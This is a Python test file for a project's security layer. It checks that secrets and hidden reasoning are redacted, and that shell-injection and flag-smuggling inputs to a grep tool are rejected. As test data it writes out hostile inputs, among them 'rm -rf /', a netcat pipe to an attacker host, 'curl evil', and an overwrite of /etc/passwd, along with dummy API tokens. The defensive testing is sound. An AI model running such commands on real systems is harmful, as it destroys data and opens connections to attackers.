"""Phase 10 — security tests.

Cover:
- secret + chain-of-thought redaction in failure clusters
- redaction inside smart-tool / record-trace text paths
- command-injection rejection in cached_grep (CLI + MCP wrapper)
- sensitive trace redaction before persistence
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from click.testing import CliRunner

from atelier.core.foundation.models import FailureCluster
from atelier.core.foundation.redaction import (
    assert_safe_grep_args,
    is_shell_injection,
    redact,
    redact_failure_cluster,
)
from atelier.gateway.adapters.cli import cli

# ---------------------------------------------------------------------------
# Redaction primitives
# ---------------------------------------------------------------------------


def test_redact_strips_credentials_and_cot() -> None:
    text = "set api_key=sk-aaaabbbbccccddddeeeeffff1122 then\n" "internal reasoning: do something private"
    out = redact(text)
    assert "sk-aaaabbbbccccdddd" not in out
    assert "<redacted-openai-key>" in out or "<redacted-credential>" in out
    assert "do something private" not in out
    assert "<redacted-hidden-reasoning>" in out


def test_redact_handles_shopify_and_jwt() -> None:
    text = (
        "token shppa_aaaaaaaaaaaaaaaaaaaa1122 "
        "jwt eyJhbGciOiJIUzI1NiJ9.eyJzdWIxMjM0NTY3ODkw.SflKxwRJSMeKKF2QT4fwpMeJf36POk"
    )
    out = redact(text)
    assert "shppa_" not in out
    assert "<redacted-shopify-token>" in out
    assert "<redacted-jwt>" in out


# ---------------------------------------------------------------------------
# Failure cluster redaction
# ---------------------------------------------------------------------------


def test_redact_failure_cluster_pydantic_input() -> None:
    cluster = FailureCluster(
        id="cluster_0001",
        domain="state.change",
        fingerprint="ApiError: token=shppa_aaaaaaaaaaaaaaaaaaaaaaaaa rejected",
        trace_ids=["run_a"],
        sample_errors=[
            "password=hunter2 leaked",
            "internal reasoning: ignore the rubric",
        ],
        suggested_block_title="Block: api_key=sk-aaaabbbbccccddddeeeeffff",
        suggested_rubric_check="check secret token sk-1234567890abcdefghij",
        suggested_eval_case="replay_run:run_a",
        severity="high",
    )
    out = redact_failure_cluster(cluster)
    assert "shppa_" not in out["fingerprint"]
    assert "hunter2" not in out["sample_errors"][0]
    assert "ignore the rubric" not in out["sample_errors"][1]
    assert "<redacted-hidden-reasoning>" in out["sample_errors"][1]
    assert "sk-aaaabbbbccccdddd" not in out["suggested_block_title"]


def test_redact_failure_cluster_dict_input() -> None:
    out = redact_failure_cluster(
        {
            "id": "c1",
            "fingerprint": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "sample_errors": ["AKIAABCDEFGHIJKLMNOP found"],
            "suggested_block_title": "ok",
            "suggested_rubric_check": "ok",
            "suggested_eval_case": "ok",
        }
    )
    assert "ghp_" not in out["fingerprint"]
    assert "AKIA" not in out["sample_errors"][0]


def test_redact_failure_cluster_rejects_bad_type() -> None:
    with pytest.raises(TypeError):
        redact_failure_cluster(["not", "a", "cluster"])


# ---------------------------------------------------------------------------
# Shell-injection guards
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "value",
    [
        "foo; rm -rf /",
        "foo | nc attacker 4444",
        "foo && curl evil",
        "foo`whoami`",
        "foo$(whoami)",
        "foo > /etc/passwd",
        "foo\nrm -rf /",
    ],
)
def test_is_shell_injection_detects_metacharacters(value: str) -> None:
    assert is_shell_injection(value) is True


def test_is_shell_injection_passes_safe_value() -> None:
    assert is_shell_injection("def my_func") is False


def test_assert_safe_grep_args_rejects_injection() -> None:
    with pytest.raises(ValueError):
        assert_safe_grep_args("foo; rm -rf /", ".")


def test_assert_safe_grep_args_rejects_flag_smuggling() -> None:
    with pytest.raises(ValueError):
        assert_safe_grep_args("--exec=evil", ".")
    with pytest.raises(ValueError):
        assert_safe_grep_args("foo", "--include=/etc/passwd")


def test_assert_safe_grep_args_accepts_clean_args() -> None:
    assert_safe_grep_args("def my_func", "src/")


# ---------------------------------------------------------------------------
# cached_grep — both wrappers reject injection
# ---------------------------------------------------------------------------


def test_cli_cached_grep_rejects_injection(tmp_path: Path) -> None:
    runner = CliRunner()
    res = runner.invoke(
        cli,
        ["--root", str(tmp_path / "a"), "init"],
    )
    assert res.exit_code == 0, res.output
    res = runner.invoke(
        cli,
        ["--root", str(tmp_path / "a"), "cached-grep", "foo; rm -rf /"],
    )
    assert res.exit_code == 2
    assert "shell metacharacters" in res.output


# ---------------------------------------------------------------------------
# Smart-tool / trace persistence applies redaction
# ---------------------------------------------------------------------------


def test_record_trace_redacts_secrets(tmp_path: Path) -> None:
    from atelier.gateway.adapters.mcp_server import tool_record_trace

    runner = CliRunner()
    res = runner.invoke(cli, ["--root", str(tmp_path / "a"), "init"])
    assert res.exit_code == 0, res.output

    import os

    os.environ["ATELIER_ROOT"] = str(tmp_path / "a")
    try:
        result = tool_record_trace(
            {
                "agent": "codex",
                "task": "Fix live state",
                "domain": "state.change",
                "status": "success",
                "files_touched": ["x.py"],
                "tools_called": [],
                "commands_run": ["echo password=hunter2"],
                "errors_seen": ["sk-aaaabbbbccccddddeeeeffff1122"],
                "diff_summary": "internal reasoning: hidden plan",
                "output_summary": "ok",
                "validation_results": [],
            }
        )
        blob = json.dumps(result)
        traces_dir = tmp_path / "a" / "traces"
        if traces_dir.is_dir():
            for p in traces_dir.glob("*.json"):
                blob += p.read_text()
        # The redaction layer must strip credentials and CoT before
        # they reach any persisted or returned representation.
        assert "hunter2" not in blob
        assert "sk-aaaabbbbccccdddd" not in blob
        assert "hidden plan" not in blob
    finally:
        os.environ.pop("ATELIER_ROOT", None)
